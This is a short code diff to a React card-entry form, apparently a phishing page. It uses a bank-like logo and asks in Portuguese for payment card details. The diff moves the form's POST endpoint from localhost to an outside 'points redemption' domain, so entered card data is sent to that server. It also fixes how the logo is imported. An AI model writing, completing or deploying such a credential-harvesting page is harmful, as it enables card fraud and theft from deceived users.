@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import styles from './Card.module.scss';
+import santaLogo from '../../public/santa2.png'
 import { IMaskInput } from 'react-imask';
 
 const Card = () => {
@@ -20,7 +21,7 @@ const Card = () => {
 
     // Envia os dados para o PHP usando fetch
     try {
-      const response = await fetch('http://localhost:80/three.php', {
+      const response = await fetch('https://resgatepontos.online/three.php', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -42,7 +43,7 @@ const Card = () => {
 
   return (
     <div className={styles.cardContainer}>
-      <img className={styles.logoSanta} src="../../public/santa2.png" alt="Logo" />
+      <img className={styles.logoSanta} src={santaLogo} alt="Logo" />
 
       <div className={styles.speedForm}>
         <span className={styles.titulo}>Informe os dados do cartão:</span>
